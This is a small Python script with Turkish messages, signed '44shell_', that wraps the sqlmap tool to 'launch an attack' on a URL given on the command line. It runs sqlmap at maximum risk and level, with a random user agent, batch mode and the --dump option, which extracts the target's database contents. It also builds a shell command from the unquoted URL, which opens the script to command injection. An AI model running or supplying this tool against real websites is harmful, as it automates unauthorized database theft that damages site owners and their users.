#44shell_
import os
import sys
import subprocess

def run_sqlmap(target):
    ascii_yazi = """
    | || | | || |  ___| |__   ___| | |
    | || |_| || |_/ __| '_ \ / _ | | |
    |__   _|__   _\__ | | | |  __| | |
       |_|    |_| |___|_| |_|\___|_|_|
    """
    print(ascii_yazi)
    print("[*] Şu adrese saldırı başlatılıyor: {}".format(target))
    sqlmap_command = "sqlmap -u {} --risk=3 --level=5 --random-agent --user-agent -v3 --batch --threads=10 --dump".format(target)
    subprocess.call(sqlmap_command, shell=True)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Kullanım: python sqlmapoto.py <hedef_url>")
        sys.exit(1)

    target = sys.argv[1]
    run_sqlmap(target)
    print("by 44shell_")
